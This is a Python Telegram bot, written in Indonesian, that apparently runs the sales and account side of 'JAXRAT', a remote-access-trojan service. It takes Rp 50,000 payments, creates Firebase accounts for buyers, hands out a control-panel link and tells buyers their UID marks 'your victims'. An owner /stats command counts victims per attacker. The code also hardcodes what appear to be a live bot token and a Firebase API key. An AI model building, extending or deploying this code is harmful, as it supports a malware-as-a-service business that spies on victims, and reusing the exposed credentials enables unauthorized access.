import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import firebase_admin
from firebase_admin import credentials, db, auth
import json
import requests
import qrcode
from io import BytesIO

# ===== KONFIGURASI =====
BOT_TOKEN = "8019851816:AAFytb4-6Owqdttdhja77wqabJt8p_ZUaho"  # GANTI
OWNER_CHAT_ID = 6754308724  # GANTI DENGAN CHAT_ID LO
FIREBASE_URL = "https://jaxrat-6813c-default-rtdb.firebaseio.com"
FIREBASE_API_KEY = "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ"

# Inisialisasi Firebase
cred = credentials.Certificate({
    "type": "service_account",
    "project_id": "jaxrat-6813c",
    "private_key_id": os.environ.get("FIREBASE_PRIVATE_KEY_ID"),
    "private_key": os.environ.get("FIREBASE_PRIVATE_KEY").replace('\\n', '\n'),
    "client_email": os.environ.get("FIREBASE_CLIENT_EMAIL"),
    "client_id": os.environ.get("FIREBASE_CLIENT_ID"),
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token"
})
firebase_admin.initialize_app(cred, {
    'databaseURL': FIREBASE_URL
})

bot = telebot.TeleBot(BOT_TOKEN)

# ===== FUNGSI FIREBASE AUTH =====
def create_firebase_user(email, password):
    """Buat user baru di Firebase Auth via REST API"""
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={FIREBASE_API_KEY}"
    payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    res = requests.post(url, json=payload)
    if res.status_code == 200:
        return res.json()
    return None

# ===== HANDLER BOT =====
@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("💳 Beli Panel", callback_data="buy"),
        InlineKeyboardButton("📞 Kontak Owner", url="https://t.me/pangeranjendral")
    )
    bot.reply_to(message, 
        "👋 *Selamat datang di JAXRAT BOT*\n\n"
        "Bot ini digunakan untuk aktivasi panel monitoring.\n"
        "Harga: *Rp 50.000* (sekali bayir, akses permanen)\n\n"
        "Klik tombol di bawah untuk mulai.", 
        parse_mode="Markdown", reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "buy")
def buy_callback(call):
    chat_id = call.message.chat.id
    
    # Generate QR Code pembayaran
    # GANTI DENGAN QR LO (QRIS/OVO/DANA)
    qr = qrcode.QRCode(box_size=10, border=4)
    qr.add_data("https://t.me/deakfta")  # Ganti dengan link pembayaran lo
    qr.make()
    
    img = qr.make_image()
    bio = BytesIO()
    bio.name = 'qr.jpeg'
    img.save(bio, 'JPEG')
    bio.seek(0)
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Udah Bayar", callback_data="paid"))
    
    bot.send_photo(
        chat_id, 
        photo=bio, 
        caption="Scan QR ini buat bayar 50rb.\n\n"
                "Transfer ke: (DANA/OVO/BCA) - 081234567890 a.n JAXRAT\n\n"
                "Klik 'Udah Bayar' setelah transfer.",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "paid")
def paid_callback(call):
    chat_id = call.message.chat.id
    
    # Forward ke owner buat verifikasi manual
    bot.forward_message(OWNER_CHAT_ID, chat_id, call.message.message_id)
    bot.send_message(OWNER_CHAT_ID, f"User {chat_id} @{call.from_user.username} claim udah bayar. Verifikasi?")
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Verifikasi", callback_data=f"verify_{chat_id}"))
    bot.send_message(OWNER_CHAT_ID, "Klik tombol ini kalo udah dicek", reply_markup=markup)
    
    bot.send_message(chat_id, "Mohon tunggu, owner bakal verifikasi pembayaran lo dalam 1x24 jam.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("verify_"))
def verify_callback(call):
    user_chat_id = int(call.data.split("_")[1])
    
    # Minta email & password
    msg = bot.send_message(user_chat_id, 
        "✅ Pembayaran diverifikasi!\n\n"
        "Sekarang buat akun Firebase lo:\n"
        "Kirim *email* dan *password* dalam format:\n`email|password`\n\n"
        "Contoh: `user@gmail.com|rahasia123`",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, process_register)

def process_register(message):
    try:
        email, password = message.text.split('|')
        email = email.strip()
        password = password.strip()
        
        # Buat user di Firebase
        user = create_firebase_user(email, password)
        if not user:
            bot.reply_to(message, "Gagal bikin user. Coba lagi nanti.")
            return
        
        uid = user['localId']
        
        # Simpan ke Realtime Database
        ref = db.reference(f'users/{uid}')
        ref.set({
            'email': email,
            'chat_id': message.chat.id,
            'username': message.from_user.username,
            'created_at': {'.sv': 'timestamp'},
            'active': True
        })
        
        # Simpan juga di settings/users_db buat tracking owner
        db.reference('settings/users_db').push({
            'uid': uid,
            'email': email,
            'chat_id': message.chat.id
        })
        
        # Kasih link grup
        bot.reply_to(message,
            f"✅ *Akun berhasil dibuat!*\n\n"
            f"📧 Email: `{email}`\n"
            f"🔑 Password: `{password}`\n"
            f"🆔 UID: `{uid}`\n\n"
            f"🔗 *Link Panel:* https://jaxrat-panel.vercel.app\n"
            f"👥 *Link Grup:* https://t.me/pangeranjendral\n\n"
            f"Simpan UID ini baik-baik, itu buat nandain korban lo.",
            parse_mode="Markdown"
        )
        
        # Notif owner
        bot.send_message(OWNER_CHAT_ID, 
            f"User baru: @{message.from_user.username}\n"
            f"UID: {uid}\nEmail: {email}"
        )
        
    except Exception as e:
        bot.reply_to(message, f"Format salah. Kirim email|password. Error: {e}")

# ===== ADMIN COMMANDS =====
@bot.message_handler(commands=['adduser'])
def admin_adduser(message):
    if message.chat.id != OWNER_CHAT_ID:
        return
    
    try:
        # Format: /adduser email|password|chat_id
        _, data = message.text.split(' ', 1)
        email, password, chat_id = data.split('|')
        
        user = create_firebase_user(email, password)
        if user:
            uid = user['localId']
            db.reference(f'users/{uid}').set({
                'email': email,
                'chat_id': int(chat_id),
                'created_by': 'owner',
                'created_at': {'.sv': 'timestamp'},
                'active': True
            })
            
            bot.reply_to(message, f"✅ User created!\nUID: {uid}\nEmail: {email}")
            
            # Notify user
            bot.send_message(int(chat_id), 
                f"🎉 Akun lo udah diaktifin owner!\n"
                f"Email: {email}\nPass: {password}\n"
                f"Panel: https://jaxrat-panel.vercel.app"
            )
        else:
            bot.reply_to(message, "❌ Gagal bikin user.")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}\nFormat: /adduser email|password|chat_id")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.chat.id != OWNER_CHAT_ID:
        return
    
    msg_text = message.text.replace('/broadcast', '').strip()
    if not msg_text:
        bot.reply_to(message, "Masukin pesan.")
        return
    
    # Ambil semua user dari Realtime DB
    users = db.reference('users').get()
    if users:
        sent = 0
        for uid, user_data in users.items():
            if user_data.get('chat_id'):
                try:
                    bot.send_message(user_data['chat_id'], f"📢 Broadcast: {msg_text}")
                    sent += 1
                except:
                    pass
        bot.reply_to(message, f"Broadcast terkirim ke {sent} user.")
    else:
        bot.reply_to(message, "Nggak ada user.")

@bot.message_handler(commands=['stats'])
def stats(message):
    if message.chat.id != OWNER_CHAT_ID:
        return
    
    users = db.reference('users').get()
    victims = db.reference('victims').get()
    
    total_users = len(users) if users else 0
    total_victims = 0
    if victims:
        for attacker in victims:
            total_victims += len(victims[attacker]) if victims[attacker] else 0
    
    bot.reply_to(message,
        f"📊 *STATISTIK JAXRAT*\n\n"
        f"👤 Total User Panel: {total_users}\n"
        f"📱 Total Korban: {total_victims}\n"
        f"💬 Bot Aktif: ✅",
        parse_mode="Markdown"
    )

if __name__ == "__main__":
    print("Bot JAXRAT berjalan...")
    bot.infinity_polling()
